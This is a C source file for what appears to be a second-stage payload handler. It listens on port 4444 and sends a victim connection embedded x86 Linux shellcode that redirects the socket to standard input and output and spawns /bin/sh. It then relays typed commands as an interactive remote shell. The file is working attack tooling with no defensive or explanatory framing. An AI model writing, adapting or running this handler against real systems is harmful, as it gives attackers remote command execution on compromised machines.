#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>

int main() {
  int s, c;
  unsigned short port = 4444;
  struct sockaddr_in addr;
  fd_set active_fd_set, read_fd_set;

  s = socket(AF_INET, SOCK_STREAM, 0);

  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = INADDR_ANY;

  bind(s, (struct sockaddr*)&addr, sizeof(addr));
  listen(s, 1);
  printf("handler started...\n");
  c = accept(s, NULL, NULL);

  unsigned char staged_payload[] = "\x99\x89\xfb\xb9\x00\x00\x00\x00\xb0\x3f\xcd\x80\xb1\x01\xb0\x3f\xcd\x80\xb1\x02\xb0\x3f\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

  send(c, staged_payload, 45, 0);
  printf("sending stage...\n");

  unsigned char tosend[128];
  unsigned char toread[4096];
  int bytes_read = 0;
  while (1)
  {
    fgets(tosend, 128, stdin);
    send(c, tosend, strlen(tosend), 0);
    bytes_read = read(c, toread, 4096);
    toread[bytes_read] = '\0';
    printf("%s", toread);
  }

  return 0;
}
